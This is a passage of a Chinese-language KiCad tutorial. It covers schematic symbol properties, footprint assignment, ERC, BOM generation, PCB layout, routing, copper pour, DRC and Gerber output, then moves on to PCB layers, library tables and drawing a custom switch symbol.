src="http://www.uinio.com/Electronics/KiCad_Tutorial/20.png"></a></p><p><strong>符号属性</strong>是每一个原理图符号的属性值，鼠标选中原理图里的 <strong>LED 发光二管</strong>，然后按下快捷键【<strong>E</strong>】或者选择鼠标右键菜单里的【<strong>属性</strong>】，打开【<strong>符号属性</strong>】对话框，将 <code>Value</code> 字段的 <code>LED</code> 修改为 <code>Red LED</code> 字符串，然后点击【<strong>确定</strong>】按钮：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/21.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/21.png"></a></p><p>采用同样的方法，将<strong>电阻器</strong>和<strong>电池</strong>符号的 <code>value</code> 属性分别修改为 <code>1k</code> 和 <code>3V</code>，修改完毕之后的原理图如下面所示：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/22.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/22.png"></a></p><p><strong>封装</strong>用于描述原理图符号映射到电路板时的物理形式，某一些原理图符号默认自带封装，而另外一些符号则需要手动进行指定。鼠标点击<strong>原理图编辑器</strong>顶部工具栏的【<strong>运行封装分配工具</strong>】按钮，打开【<strong>关联封装</strong>】对话框：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/23.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/23.png"></a></p><p>分别为当前原理图当中的符号，选择如下对应的<strong>封装规格</strong>，然后点击【<strong>确定</strong>】按钮完成封装分配：</p><ul><li><strong>电池</strong>：<code>Battery:BatteryHolder_Keystone_1058_1x2032</code></li><li><strong>电阻</strong>：<code>Resistor_THT:R_Axial_DIN0309_L9.0mm_D3.2mm_P12.70mm_Horizontal</code></li><li><strong>发光二极管</strong>：<code>LED_THT:LED_D5.0mm</code></li></ul><p>筛选封装的过程当中，要善于利用对话框顶部的【<strong>封装筛选器</strong>】功能，它们分别是：</p><ul><li>按 <strong>库</strong> 筛选封装列表；</li><li>按 <strong>引脚数量</strong> 筛选封装列表；</li><li>按 <strong>符号中定义的封装筛选器</strong> 筛选封装列表；</li></ul><blockquote><p><strong>注意</strong>：除此之外，也可以选择在原理图符号的【<strong>符号属性</strong>】对话框直接分配封装。</p></blockquote><h3 id="ERC-电气规则检查"><a href="#ERC-电气规则检查" class="headerlink" title="ERC 电气规则检查"></a>ERC 电气规则检查</h3><p>通常会在原理图设计的最后阶段，执行一次<strong>电气规则检查</strong>（<strong>ERC</strong>，Electrical Rules Check），鼠标点击<strong>原理图编辑器</strong>顶部的【<strong>执行电气规则检查</strong>】按钮，打开【<strong>电气规则检查 (ERC)<strong>】对话框，然后点击【</strong>运行 ERC</strong>】按钮执行检查：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/24.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/24.png"></a></p><p>可以看到，通过 <strong>ERC</strong> 电气规则检查器，<strong>KiCad</strong> 发现了两处错误。用鼠标选中错误信息，<strong>KiCad</strong> 就会自动定位至原理图当中的报错位置。这个 <code>输入电源引脚不受任何输出电源引脚驱动</code> 错误在初次上手 <strong>KiCad</strong> 的时候比较常见，需要添加原理图符号库当中的 <code>PWR_FLAG</code> 符号，显式的将 <code>VCC</code> 和 <code>GND</code> 标注为<strong>电源引脚</strong>，并且重新<strong>分配位号</strong>和<strong>运行 ERC 检查</strong>。正常情况下 <strong>KiCad</strong> 将不会再提示错误信息，最终获得的原理图如下面所示：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/25.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/25.png"></a></p><p>虽然 <strong>KiCad</strong> 提供的 ERC 电气规则检查器，无法确保原理图设计能够正常工作，但是仍然可以检查出一些常见的问题。具体的 <strong>KiCad</strong> 电气检查规则，可以通过鼠标点击<strong>原理图编辑器</strong>菜单栏的【<strong>文件 ➞ 原理图设置</strong>】：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/26.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/26.png"></a></p><p>然后，打开【<strong>原理图设置</strong>】对话框下的【<strong>电气规则</strong>】菜单项进行查看：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/27.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/27.png"></a></p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/28.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/28.png"></a></p><h3 id="BOM-物料清单"><a href="#BOM-物料清单" class="headerlink" title="BOM 物料清单"></a>BOM 物料清单</h3><p>最后一个可选的步骤是生成<strong>物料清单</strong>（<strong>BOM</strong>，Bill Of Material），鼠标点击<strong>原理图编辑器</strong>顶部工具栏的【<strong>生成当前原理图的 BOM</strong>】按钮，打开【**BOM (物料清单)**】对话框：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/29.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/29.png"></a></p><p>选择对话框当中的 <code>bom_csv_grouped_by_value_with_fp</code> 脚本，然后鼠标点击【<strong>生成</strong>】按钮，此时 <strong>KiCad</strong> 就会执行如下 Python 脚本：</p><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br></pre></td><td><pre><span>python</span><br><span><span>"D:\Software\Tech\KiCad\bin\scripting\plugins/bom_csv_grouped_by_value_with_fp.py"</span></span><br><span><span>"D:\workspace\abrams\Tutorial\uinio.xml"</span> <span>"D:/workspace/abrams/Tutorial/uinio.csv"</span></span><br><span>成功。</span><br></pre></td></tr></tbody></table><p>从而在当前工程所在的目录下面，生成以 <code>.csv</code> 和 <code>.xml</code> 作为后缀名的文件，其中的 <code>.csv</code> 就是 <strong>BOM</strong> 文件：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/30.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/30.png"></a></p><h2 id="电路板绘制"><a href="#电路板绘制" class="headerlink" title="电路板绘制"></a>电路板绘制</h2><p>完成原理图的绘制工作以后，鼠标左键点击<strong>原理图编辑器</strong>顶部工具栏的【<strong>在电路板编辑器中打开 PCB</strong>】按钮，或者返回<strong>工程管理器</strong>点击【<strong>PCB 编辑器</strong>】按钮，就可以打开 PCB 电路板文件 <code>uinio.kicad_pcb</code>。在 <strong>PCB 编辑器</strong>当中同样可以通过【<strong>鼠标中键</strong>】或者【<strong>鼠标右键</strong>】平移原理图，或者使用按键【<strong>F1 &#x2F; F2</strong>】以及【<strong>鼠标滚轮</strong>】进行放大与缩小。</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/30-1.gif"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/30-1.gif"></a></p><p><strong>PCB 编辑器</strong>的中间是用于设计电路板的编辑区，左侧工具栏是各种显示选项，而右侧工具栏则包含有 PCB 设计工具。除此之外，最右侧还有【<strong>外观</strong>】面板和【<strong>选择筛选器</strong>】面板。</p><h3 id="PCB-设置"><a href="#PCB-设置" class="headerlink" title="PCB 设置"></a>PCB 设置</h3><p>开始设计 PCB 电路板之前，可以先设置一些 PCB 电路板文件的信息，鼠标左键单击【<strong>文件 ➞ 图框设置</strong>】，这里同样将 PCB 图框的尺寸设置为 <code>A4 210 × 297mm</code> 大小，而<strong>发行日期</strong>、<strong>修订</strong>、<strong>标题</strong>、<strong>厂商信息</strong>设置分别如下图所示：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/31.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/31.png"></a></p><p>接下来，转到【<strong>文件 ➞ 电路板设置</strong>】定义 PCB 如何进行生产制造，这里最重要的选项是【<strong>物理压层</strong>】，这里保持默认的<strong>铜层</strong>数量为 <code>2</code> 层即可：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/32.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/32.png"></a></p><p>接下来，转到【<strong>设计规则 ➞ 约束</strong>】界面，这里需要根据 PCB 制造工厂的工艺规格进行相应设置，在这里我们保持默认值即可：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/33.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/33.png"></a></p><p>最后，打开【<strong>设计规则 ➞ 网络类表</strong>】界面，<strong>KiCad</strong> 可以支持基于<strong>网络类</strong>来为特定的电路网络配置设计规则：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/34.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/34.png"></a></p><blockquote><p><strong>注意</strong>：虽然可以在绘制电路板的过程当中手动管理这些约束，但是 <strong>KiCad</strong> 官方还是建议使用<strong>网络类</strong>，因为它能够自动的进行设计规则检查。</p></blockquote><h3 id="导入原理图"><a href="#导入原理图" class="headerlink" title="导入原理图"></a>导入原理图</h3><p>打开<strong>原理图编辑器</strong>顶部工具栏的【<strong>在电路板编辑器中打开 PCB</strong>】按钮或者直接按下快捷键【<strong>F8</strong>】，打开【<strong>从原理图更新 PCB</strong>】对话框，点击【<strong>更新 PCB</strong>】按钮，将之前原理图当中的设计数据导入至 <strong>PCB 编辑器</strong>：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/35.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/35.png"></a></p><p>然后移动鼠标，选择的合适的位置按下【<strong>鼠标左键</strong>】，把原理图当中的 3 个元件封装放置在<strong>原理图编辑器</strong>的编辑区当中：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/36.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/36.png"></a></p><h3 id="绘制-PCB-板框"><a href="#绘制-PCB-板框" class="headerlink" title="绘制 PCB 板框"></a>绘制 PCB 板框</h3><p>放置好元件封装以后，就可以开始绘制 PCB 板框，绘制板框时通常需要将<strong>网格尺寸</strong>切换至 <code>1mm</code>，同时选中【外观】面板当中的 <code>Edge.Cuts</code> 层：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/37.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/37.png"></a></p><p>鼠标选择右侧工具栏当中的【<strong>绘制矩形</strong>】，围绕 3 个元件封装绘制一个闭合的矩形作为 PCB 板框：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/38.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/38.png"></a></p><blockquote><p><strong>注意</strong>：除此之外，还可以利用右侧工具栏当中提供的工具，绘制出<strong>线</strong>、<strong>圆弧</strong>、<strong>矩形</strong>、<strong>圆形</strong>、<strong>多边形</strong>，组合运用它们就能够绘制出复杂的板框形状。</p></blockquote><h3 id="元件的摆放布局"><a href="#元件的摆放布局" class="headerlink" title="元件的摆放布局"></a>元件的摆放布局</h3><p>完成板框的绘制之后，接下来的工作便是对元件进行合理的摆放与布局，通常需要考虑到下面几个因素：</p><ul><li>遵循结构要求，合理的布局<code>连接器</code>、<code>屏幕</code>、<code>按钮</code>、<code>开关</code>等接插元件；</li><li>考虑<strong>信号完整性</strong>问题，例如旁路电容应当靠近关联的电源引脚，敏感的模拟元件应当远离数字信号的干扰；</li><li>合理的选择将元件封装放置在 PCB 电路板的<strong>正面</strong>（Front）或者<strong>反面</strong>（Back）；</li><li>根据<strong>预拉线</strong>（也称为<strong>飞线</strong>，Ratsnest）的提示，元件的摆放位置要便于布线操作，相互连接的元件封装要摆放到一起；</li></ul><p>选择 <strong>KiCad</strong> 右侧外观面板上的 <code>F.Cu</code> 顶层铜层，按下快捷键【<strong>M</strong>】按照下图所示移动与摆放元件封装，然后选中<strong>电池座</strong> <code>BT1</code>，接下快捷键【<strong>F</strong>】将其从 <code>F.Cu</code> <strong>顶层</strong>（显示为红色）翻转至 <code>B.Cu</code> <strong>底层</strong>（显示为蓝色）：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/39.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/39.png"></a></p><h3 id="开始布线"><a href="#开始布线" class="headerlink" title="开始布线"></a>开始布线</h3><p>完成元件封装的摆放布局之后，就可以开始着手进行布线了。首先将当前的活动层切换至 <code>F.Cu</code> <strong>顶层铜层</strong>，然后点击工具栏上的【<strong>布线</strong>】按钮，或者直接按下快捷键【<strong>X</strong>】，开始连接元件封装的焊盘，布线过程当中如果按下快捷键【<strong>V</strong>】则会在鼠标停留位置添加一个连接<strong>顶层</strong>与<strong>底层</strong>的<strong>通孔</strong>，按下鼠标放置过孔之后，同时走线也会自动切换至 <code>B.Cu</code> <strong>底层铜层</strong>，完成布线之后的 PCB 电路板如下图所示：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/40.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/40.png"></a></p><blockquote><p><strong>注意</strong>：布线过程当中，可以通过按下快捷键【<strong>W</strong>】和【<strong>Shift + W</strong>】前后切换预定义的<strong>线宽</strong>。</p></blockquote><h3 id="覆铜操作"><a href="#覆铜操作" class="headerlink" title="覆铜操作"></a>覆铜操作</h3><p>数字电路设计当中，覆铜区域通常会与 <code>GND</code> 或者 <code>VCC</code> 相互连接，从而降低<strong>地线阻抗</strong>提升抗干扰能力，或者降低<strong>电压降</strong>提升电源效率。鼠标点击右侧工具栏当中的【<strong>添加填充覆铜</strong>】或者按下快捷键【<strong>Ctrl + Shift + Z</strong>】。此时 <strong>KiCad</strong> 会自动弹出【<strong>覆铜区属性</strong>】对话框：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/41.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/41.png"></a></p><p>这里选择<strong>覆铜区</strong>所在的层为 <code>B.Cu</code> <strong>底层铜层</strong>，所要连接的网络为 <strong>GND</strong>，然后点击按钮【<strong>确定</strong>】，依次选择出覆铜区域的四个角，最后双击鼠标完成覆铜区域的框选：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/42.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/42.png"></a></p><p>接着鼠标展开 <strong>KiCad</strong> 顶部菜单栏的【<strong>编辑 ➞ 填充所有覆铜</strong>】，或者直接按下快捷键【<strong>B</strong>】，对覆铜区域进行填充操作：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/43.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/43.png"></a></p><blockquote><p><strong>注意</strong>：覆铜操作之后，如果移动了元件封装，此时 <strong>KiCad</strong> 并不会自动重新进行覆铜，必须再次手动进行覆铜操作。除此之外，如果覆铜区域在视觉上比较遮挡接下来的布线操作，则可以点击左侧工具栏上的【<strong>仅显示覆铜边界</strong>】按钮，隐藏覆铜区的高亮颜色。</p></blockquote><h3 id="DRC-设计规则检查"><a href="#DRC-设计规则检查" class="headerlink" title="DRC 设计规则检查"></a>DRC 设计规则检查</h3><p>最后，鼠标选择 <strong>KiCad</strong> 顶部工具栏的【<strong>显示设计规则检查器窗口</strong>】，点击【<strong>运行 DRC</strong>】按钮开始执行 DRC 设计规则检查：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/44.gif"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/44.gif"></a></p><p>DRC 设计规则的相关提示信息，可以在 <strong>KiCad</strong> 顶部菜单栏【<strong>文件 ➞ 电路板设置 ➞ 设计规则 ➞ 违规严重程度</strong>】的下面进行配置：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/45.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/45.png"></a></p><blockquote><p><strong>注意</strong>：当 <strong>KiCad</strong> 提示 DRC 检查的<strong>错误</strong>和<strong>警告</strong>数量为 <code>0</code> 的时候，就完成了 PCB 电路板的全部设计过程。</p></blockquote><h3 id="查看-3D-效果"><a href="#查看-3D-效果" class="headerlink" title="查看 3D 效果"></a>查看 3D 效果</h3><p><strong>KiCad</strong> 的 <strong>PCB 编辑器</strong>提供了一个 <strong>3D 查看器</strong>，可以用于查看 PCB 电路板的实物效果。鼠标点击顶部菜单栏的【<strong>视图 ➞ 3D 查看器</strong>】，或者直接按下快捷键【<strong>Alt + 3</strong>】，就可以实时的查看到当前 PCB 电路板的 3D 预览效果：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/46.gif"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/46.gif"></a></p><h2 id="制造输出"><a href="#制造输出" class="headerlink" title="制造输出"></a>制造输出</h2><p>完成 PCB 电路板的设计工作之后，就可以导出 <strong>Gerber</strong> 光绘文件，交付给工厂进行加工制造生产。</p><h3 id="生成-Gerber-文件"><a href="#生成-Gerber-文件" class="headerlink" title="生成 Gerber 文件"></a>生成 Gerber 文件</h3><p>鼠标选择 <strong>PCB 编辑器</strong>顶部菜单栏上面的【<strong>文件 ➞ 制造输出 ➞ Gebers (.gbr)<strong>】，在弹出的【</strong>绘制</strong>】对话框里，按照下图所示的选项进行设置。按下【<strong>绘制</strong>】按钮之后，生成的 <strong>Gerber</strong> 文件将会存放至当前工程的 <code>Gerber</code> 目录下面：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/47.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/47.png"></a></p><h3 id="生成钻孔文件"><a href="#生成钻孔文件" class="headerlink" title="生成钻孔文件"></a>生成钻孔文件</h3><p>按下【<strong>绘制</strong>】按钮生成 <strong>Geber</strong> 文件之后，再点击【<strong>绘制</strong>】对话框右下角的【<strong>生成钻孔文件</strong>】按钮，在打开的【<strong>生成钻孔文件</strong>】对话框里勾选如下设置，这里依然将生成的<strong>钻孔文件</strong>存放在当前工程的 <code>Gerber</code> 目录：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/48.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/48.png"></a></p><h3 id="生成封装位置文件"><a href="#生成封装位置文件" class="headerlink" title="生成封装位置文件"></a>生成封装位置文件</h3><p>鼠标选择 <strong>PCB 编辑器</strong>顶部菜单栏上面的【<strong>文件 ➞ 制造输出 ➞ 元件放置文件 (.pos)<strong>】，在弹出的【</strong>生成放置文件</strong>】对话框里进行如下设置，这里同样把生成的<strong>位置文件</strong>存放在当前工程的 <code>Gerber</code> 目录：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/49.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/49.png"></a></p><h3 id="预览-Gerber-文件"><a href="#预览-Gerber-文件" class="headerlink" title="预览 Gerber 文件"></a>预览 Gerber 文件</h3><p>使用 <strong>KiCad</strong> 提供的 <strong>Gerber 文件查看器</strong> ，可以打开上述步骤在 <code>Gerber</code> 目录下生成的<strong>绘制文件</strong>与<strong>钻孔文件</strong>进行预览：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/50.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/50.png"></a></p><h3 id="生产制造文件清单"><a href="#生产制造文件清单" class="headerlink" title="生产制造文件清单"></a>生产制造文件清单</h3><p>经过上述一系列的操作步骤之后，就可以将生成的这 <strong>11</strong> 个文件交付给 PCB 电路板工厂进行生产制造：</p><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br></pre></td><td><pre><span><span>D:\<span>Workspace</span>\<span>abrams</span>\<span>Tutorial</span>\<span>Gerber</span>(<span>master</span> -&gt; <span>origin</span>)</span></span><br><span><span>λ <span>ls</span></span></span><br><span><span></span></span><br><span><span><span>uinio.drl</span>       <span>uinio</span>-<span>B_Mask.gbs</span>        <span>uinio</span>-<span>Edge_Cuts.gm1</span>  <span>uinio</span>-<span>F_Paste.gtp</span></span></span><br><span><span><span>uinio</span>-<span>all.pos</span>   <span>uinio</span>-<span>B_Paste.gbp</span>       <span>uinio</span>-<span>F_Cu.gtl</span>       <span>uinio</span>-<span>F_Silkscreen.gto</span></span></span><br><span><span><span>uinio</span>-<span>B_Cu.gbl</span>  <span>uinio</span>-<span>B_Silkscreen.gbo</span>  <span>uinio</span>-<span>F_Mask.gts</span></span></span><br></pre></td></tr></tbody></table><h2 id="电路板的分层"><a href="#电路板的分层" class="headerlink" title="电路板的分层"></a>电路板的分层</h2><p><strong>KiCad</strong> 提供的 <strong>PCB 编辑器</strong> 支持多达 <code>49</code> 个不同的图层，其中 <code>32</code> 个用于布线的<strong>铜层</strong>，以及 <code>14</code> 个固定用途的<strong>技术层</strong>（包含 <code>12</code> 个正面或背面的<strong>配对技术层</strong>以及 <code>2</code> 个<strong>独立技术层</strong>）。除此之外，还拥有 <code>User.1 ~ User.9</code> 一共 9 个可供用户自定义的图层，以及 <code>User.Eco1</code>、<code>User.Eco2</code>、<code>User.Comments</code>(注释层)、<code>User.Drawings</code>(图纸层) 这 4 个<strong>辅助层</strong>：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/51.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/51.png"></a></p><p>打开 <strong>PCB 编辑器</strong>顶部菜单栏的【<strong>电路板设置</strong>】，展开【<strong>电路板压层</strong>】菜单的<strong>物理压层</strong>与<strong>电路板编辑器图层</strong>，就可以对当前 PCB 电路板的分层信息进行设置：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/52.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/52.png"></a></p><h3 id="铜层"><a href="#铜层" class="headerlink" title="铜层"></a>铜层</h3><p><strong>铜层</strong>（<code>F.Cu</code>、<code>B.Cu</code>、<code>In编号.Cu</code>）：用于放置元件与布线的常用工作层，层编号从<code>0</code>开始（即最前面的第 <code>1</code> 个铜层）到 <code>31</code>（即最后的第 32 个铜层）结束，由于元器件不能摆放在编号 <code>1 ~ 30</code> 的内层当中，因而只有<strong>第</strong> <code>0</code> 和<strong>第</strong> <code>31</code> 这两层属于<strong>元件层</strong>。</p><h3 id="配对技术层"><a href="#配对技术层" class="headerlink" title="配对技术层"></a>配对技术层</h3><p>这 <code>12</code> 个配对技术层总是成对出现：一个用于<strong>正面</strong>（用 <code>F</code> 标识），另外一个用于<strong>背面</strong>（用 <code>B</code> 标识），构成这些层之一的覆盖区（焊盘，绘图，文本）元素将会自动镜像，并在翻转覆盖区时移动到补充层。</p><ul><li><strong>粘合剂层</strong>（<code>F.Adhesive</code>、<code>B.Adhesive</code>）：用于<strong>粘合剂涂抹</strong>，通常在波峰焊之前将贴片元件粘贴至 PCB；</li><li><strong>焊膏层</strong>（<code>F.Paste</code>、<code>B.Paste</code>）：用于<strong>制造钢网</strong>，以方便在进行回流焊之前，在贴片元件焊盘上涂抹锡浆；</li><li><strong>丝印层</strong>（<code>F.Silkscreen</code>、<code>B.Silkscreen</code>）：用于<strong>标识元件</strong>的层，例如元件的极性、首引脚标识、安装参考等；</li><li><strong>阻焊层</strong>（<code>F.Mask</code>、<code>B.Mask</code>）：用于<strong>放置焊盘</strong>的层，该层不会被阻焊油覆盖；</li><li><strong>封装层</strong>（<code>F.Courtyard</code>、<code>B.Courtyard</code>）：用于展示元件在电路板上面占用<strong>物理空间</strong>的大小；</li><li><strong>制造层</strong>（<code>F.Fab</code>、<code>B.Fab</code>）：用于记录需要传递给 PCB 电路板生产工厂的<strong>加工制造信息</strong>；</li></ul><h3 id="独立技术层"><a href="#独立技术层" class="headerlink" title="独立技术层"></a>独立技术层</h3><ul><li><strong>边缘切割</strong>（<code>Edge.Cuts</code>）用于绘制电路板边框，放置在该图层上的任何元素（例如<code>图形</code>与<code>文本</code>）都会出现在其它层；</li><li><strong>电气边界</strong>（<code>Margin</code>）用于划分<strong>板框</strong>的电气边界，避免元件封装和走线被放置到<strong>板框</strong>以外；</li></ul><h2 id="库与库表的管理"><a href="#库与库表的管理" class="headerlink" title="库与库表的管理"></a>库与库表的管理</h2><p><strong>KiCad</strong> 当中的<code>原理图符号</code>和 <code>PCB 封装</code>都是以<strong>库</strong>的形式进行组织（即<strong>原理图符号库</strong>与 <strong>PCB 封装库</strong>），它们分别以<strong>原理图符号库表</strong>和 <strong>PCB 封装库表</strong>的形式被 <strong>KiCad</strong> 纳入进行管理，<strong>库表</strong>当中主要保存有库的<strong>名称</strong>以及所存储的<strong>磁盘位置</strong>。</p><p><strong>库表</strong>分为<strong>全局</strong>和<strong>工程</strong>两种作用域，其中<strong>全局库表</strong>里的<code>符号</code>与<code>封装</code>在所有工程当中共用，而<strong>工程库表</strong>当中的<code>符号</code>与<code>封装</code>只对指定的工程可用，<strong>KiCad</strong> 允许用户将自定义的<strong>库</strong>添加至<strong>全局库表</strong>或者<strong>工程库表</strong>当中。</p><p>在<strong>原理图编辑器</strong>当中，点击顶部菜单栏的【<strong>偏好设置 ➞ 管理符号库</strong>】，就可以打开<strong>符号库</strong>的管理界面：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/53.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/53.png"></a></p><p>在<strong>PCB 编辑器</strong>当中，同样点击顶部菜单栏的【<strong>偏好设置 ➞ 管理封装库</strong>】，也可以打开封装库的管理界面：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/54.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/54.png"></a></p><p>观察上图可以发现，<strong>库</strong>的路径都是采用<strong>路径变量</strong>进行定义的，这样即使用户把所有<strong>库</strong>移动到新的位置，只需要重新定义<strong>路径变量</strong>指向新的位置即可，<strong>KiCad</strong> 的<strong>路径变量</strong>可以在<strong>原理图编辑器</strong>或者<strong>PCB 编辑器</strong>顶部菜单栏的【<strong>偏好设置 ➞ 配置路径</strong>】界面进行设置：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/55.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/55.png"></a></p><blockquote><p><strong>注意</strong>：上述界面当中的<code>&#123;KIPRJMOD&#125;</code>是一个非常有用的<strong>路径变量</strong>，该变量始终指向当前的工程目录，因而可以用于指定仅用于当前工程的<strong>符号库</strong>或者<strong>封装库</strong></p></blockquote><p>通过鼠标点击 <strong>KiCad</strong> 提供的<strong>符号编辑器</strong>或者<strong>封装编辑器</strong>顶部菜单栏的【<strong>文件 ➞ 新建库</strong>】，就可以新建一个<code>符号库</code>或者<code>封装库</code>，此时两者都会弹出一个【<strong>添加到库表</strong>】对话框，询问要将该新建<strong>库</strong>添加至<strong>全局库表</strong>还是<strong>工程库表</strong>：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/56.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/56.png"></a></p><p><code>符号</code>和<code>封装</code><strong>库表文件</strong>的具体存放位置，取决于当前所使用的操作系统：</p><ul><li><strong>Linux</strong>: <code>~/.config/kicad/6.0/sym-lib-table</code> 和 <code>~/.config/kicad/6.0/fp-lib-table</code>；</li><li><strong>Windows</strong>: <code>%APPDATA%\kicad\6.0\sym-lib-table</code> 和 <code>%APPDATA%\kicad\6.0\fp-lib-table</code>；</li><li><strong>MacOS</strong>: <code>~/Library/Preferences/kicad/6.0/sym-lib-table</code> 和 <code>~/Library/Preferences/kicad/6.0/fp-lib-table</code>；</li></ul><h2 id="自定义原理图符号"><a href="#自定义原理图符号" class="headerlink" title="自定义原理图符号"></a>自定义原理图符号</h2><h3 id="新建符号库"><a href="#新建符号库" class="headerlink" title="新建符号库"></a>新建符号库</h3><p>鼠标点击<strong>原理图编辑器</strong>顶部菜单栏的【<strong>工具 ➞ 符号编辑器</strong>】，就可以打开原理图<strong>符号编辑器</strong>对话框：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/57.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/57.png"></a></p><p>继续点击<strong>符号编辑器</strong>顶部菜单栏的【<strong>文件 ➞ 新建库</strong>】，新建一个名称为 <code>Getting_Started.kicad_sym</code> 的<strong>符号库</strong>，将其加入至【<strong>工程</strong>】库表，并且选择存放在当前的工程目录之下，此时<strong>符号编辑器</strong>左侧的【<strong>库</strong>】面板就会自动刷新显示出 <code>Getting_Started</code> 库：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/58.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/58.png"></a></p><h3 id="新建符号"><a href="#新建符号" class="headerlink" title="新建符号"></a>新建符号</h3><p>鼠标选中左侧【<strong>库</strong>】面板当中的 <code>Getting_Started</code> 库，再点击鼠标右键菜单当中的【<strong>新建符号</strong>】选项，新建一个符号名称为 <code>M2011S3A1W03</code>，默认位号为 <code>SW</code> 的<strong>单刀单掷开关</strong>（<strong>SPST</strong>，Single-Pole Single-Throw）：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/59.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/59.png"></a></p><blockquote><p><strong>注意</strong>：该型号为 <code>M2011S3A1W03</code> <strong>单刀单掷开关</strong>的数据手册点击可以<a href="https://www.nkkswitches.com/pdf/MtogglesBushing.pdf">这里</a>进行下载。</p></blockquote><p>此时，这个新建的名称为 <code>M2011S3A1W03</code> 的原理科符号就会出现在【<strong>库</strong>】面板当中，接下来就可以在 <strong>KiCad</strong> 中间的编辑区进行符号的绘制工作：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/60.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/60.png"></a></p><h3 id="绘制符号引脚"><a href="#绘制符号引脚" class="headerlink" title="绘制符号引脚"></a>绘制符号引脚</h3><p>首先点击<strong>符号编辑器</strong>右侧工具栏当中的【<strong>符号引脚</strong>】按钮，或者直接按下快捷键【<strong>P</strong>】，然后再点击编辑区弹出【<strong>引脚属性</strong>】对话框。这里设置<strong>引脚名称</strong>为 <code>A</code>，<strong>引脚编号</strong>为 <code>2</code>，<strong>电气类型</strong>选择为 